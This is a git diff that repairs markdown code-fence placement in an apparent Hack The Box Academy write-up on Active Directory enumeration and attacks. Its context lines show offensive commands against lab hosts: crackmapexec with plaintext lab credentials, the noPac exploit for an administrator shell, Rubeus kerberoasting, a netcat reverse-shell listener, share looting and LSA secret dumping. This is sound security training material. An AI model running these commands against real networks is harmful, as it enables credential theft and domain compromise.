@@ -85,8 +85,8 @@ and then we will be requested to enter the password.
 For windows – we will use xfreerdp with the command:
 ```bash
 xfreerdp /v:<Target IP> /u:<username> /p:<password>
-```
 /dynamic-resolution
+```
 
 Throughout the module, those steps will be referred as 'login to the
 Linux/Windows target machine'.
@@ -208,8 +208,8 @@ Now that we have that, we can run the 'fping':
 
 ```bash
 nmap -p 1433 -sV -iL alive_hosts.txt | | grep -B 4
-```
 "Microsoft SQL Server 2019"
+```
 the commands performs nmap scan on SQL port 1433 with enhanced service
 inspection for details and version enabled (-sV), takes its input hosts from
 alive_host.txt, and filter the results for the 4 lines relevant to the string
@@ -479,8 +479,8 @@ And the 'min_password_length' is displayed.
 Method 4: we use crackmapexec:
 ```bash
 crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --
-```
 pass-pol
+```
 this method assumes we have a valid user's credentials –
 avazquez:Password123 in this case. We run it:
 
@@ -634,8 +634,8 @@ Method: we will use 'crackmapexec' – active directory enumartion and
 ```bash
 exploitation tool:
 sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --
-```
 groups | grep Interns
+```
 with this command we use 'crackmapexec' to enumerate smb shares on the
 target server, using the credentials of the valid user 'forend:Klmcargo2' for
 groups data. Then we will filter for 'Interns' group to be displayed:
@@ -666,8 +666,8 @@ well – and as usual with the target windows machines – it will be found in
 'C:\tools', we will use the PowerShell commands:
 ```bash
 cd C:\Tools\
-```
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
 Where the first command will change directory to 'tools', and the second
 command will run 'SharpHound' with -c flag (collectionmethods) set to 'All',
 and the output will be directed to zip called 'ILFREIGHT':
@@ -1633,8 +1633,8 @@ sudo python3 /opt/noPac/noPac.py
 INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-
 ```bash
 host ACADEMY-EA-DC01 -shell --impersonate administrator -
-```
 use-ldap
+```
 what the command does is using the 2 vulnerabilities above: 'CVE-2021-42278'
 - a bypass vulnerability that allows potential attackers to impersonate a domain
 controller using computer account 'SAMAccountName' spoofing.
@@ -2099,8 +2099,8 @@ tools.
 First – lets re-confirm DC02's domain via the Linux command:
 ```bash
 rpcclient -U 'htb-student_adm%HTB_@cademy_stdnt_admin!' -c
-```
 'lsaquery' 172.16.5.240
+```
 where the user is the already provided 'htbb-student_adm' with the password
 'HTB_@cademy_stdnt_admin!' which are also already provided – and the
 target IP is the DC02 IP:
@@ -2244,9 +2244,9 @@ Now that we have the information we need, and confirmed we indeed can
 conduct kerberoasting attack on 'mssqlsvc' – we will use 'Rubeus' tool for the
 ```bash
 exploitation of the TGS – we will use the command:
-```
 .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL
 /user:mssqlsvc /nowrap
+```
 
 ![Figure 66.1 — Lab execution and output verification (Page 66)](/assets/images/posts/htb-academy/active-directory-enumeration-and-attacks/p066_01.png)
 *_Figure 66.1 — Lab execution and output verification (Page 66)_*
@@ -2360,8 +2360,8 @@ smb port 445 is open – lets use that.
 Lets inspect running smb-shares with the command:
 ```bash
 smbclient -L //ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -U
-```
 "FREIGHTLOGISTICS\sapsso"
+```
 we will be prompted for password
 
 Here the obtained credentials 'sapsso:pabloPICASSO' will come in:
@@ -2667,8 +2667,8 @@ dir | findstr PowerView.ps1
 
 ```bash
 nc -lnvp <listener-port>
-```
 I chose the listener-port to be 4447 arbitrary:
+```
 
 We will also want to determine our attacking-machine IP with 'ifconfig' (the
 correct interface is the one which IP begins with 10 which used by hackthebox
@@ -3181,7 +3181,7 @@ nmap 172.16.6.3 -sV -p 1-4000
 
 
 Ok first we observe that DC01 is the network's DNS server (which can be used
-to detect future machine with the command 'nslookup <domain> 172.16.6.3'
+to detect future machine with the command 'nslookup `<domain>` 172.16.6.3'
 and that WILL work from the pwnbox:
 
 ![Figure 96.1 — Lab execution and output verification (Page 96)](/assets/images/posts/htb-academy/active-directory-enumeration-and-attacks/p096_01.jpg)
@@ -3587,8 +3587,8 @@ When the agent has executed on the target PAR02-SA2, on the pwnbox proxy
 we will get agent joined.
 ```bash
 Run on the proxy CLI the commands:
-```
 session
+```
 1
 start
 to select session 1 (our agent that just joined), and start the tunnelling:
@@ -3612,9 +3612,8 @@ Lets confirm that via pinging MS01 from pwnbox:
 Good! We have a connection – we can RDP our way in to MS01 from the
 pwnbox, using the same xfreerdp command we did throughout the writeup:
 ```bash
-xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /dynamic-
+xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /dynamic-resolution
 ```
-resolution
 the target is MS01 (172.16.7.50) and the credentials are the username and
 password we obtained in the previous 2 questions.
 We run the xfreerdp.. (enter y when needed)
@@ -3642,8 +3641,8 @@ Open the C:\ drive:
 on Linux PAR02-SA2 target machine – we run the following command:
 ```bash
 crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users | tee
-```
 users.txt
+```
 the command will enumerate for usernames with 'AB920' privileges (which are
 required, else we get 'ACCESS DENIED').
 We will use crackmapexec tool for that purpose, redirect the output for 'tee'
@@ -3681,8 +3680,8 @@ located at the fifth column, just after the '\'mark.
 Lets Isolate them by truncation technique, we will need 'awk', and 'cut':
 ```bash
 cat users.txt | awk '{print $5}' | cut -d '\' -f2 >
-```
 final_users.txt
+```
 
 ![Figure 112.1 — Lab execution and output verification (Page 112)](/assets/images/posts/htb-academy/active-directory-enumeration-and-attacks/p112_01.png)
 *_Figure 112.1 — Lab execution and output verification (Page 112)_*
@@ -3731,8 +3730,8 @@ lets run the following command to determine which shares 'BR086' can read
 within DC01
 ```bash
 sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 --
-```
 shares
+```
 
 
 BR086 can read the bottom 4 shares. The share of 'Department Shares' looks
@@ -3757,16 +3756,16 @@ mkdir imported_data
 
 ```bash
 sudo mount -t cifs //172.16.7.3/"Department Shares"
-```
 imported_data -o username=BR086,password=Welcome1
+```
 lets confirm download
 
 Now when the data is safely on our machine – on the directory
 'imported_data', lets search it
 ```bash
 sudo find imported_data -type f 2>/dev/null | xargs grep -i
-```
 "connectionString" 2>/dev/null
+```
 
 
 We can observer that the connection String credentials are
@@ -4082,8 +4081,8 @@ We can observe the 'mssqlsvc' credentials are clear-text visible.
 Option 2 - We can also run:
 ```bash
 crackmapexec smb 172.16.7.60 -u administrator -p jonsnow --
-```
 local-auth --lsa
+```
 
 
 *both commands above do the exact same purpose *
@@ -4091,8 +4090,8 @@ When we have mssqlsvc: Sup3rS3cur3maY5ql$3rverE credentials – lets run
 them on MS01 RDP:
 ```bash
 xfreerdp /v:172.16.7.50 /u:mssqlsvc
-```
 /p:'Sup3rS3cur3maY5ql$3rverE' /dynamic-resolution
+```
 *make sure that the password are within quotation marks because of the '$'
 symbol in it. *
 *we can also use WinRM, but RDP is cooler (: *
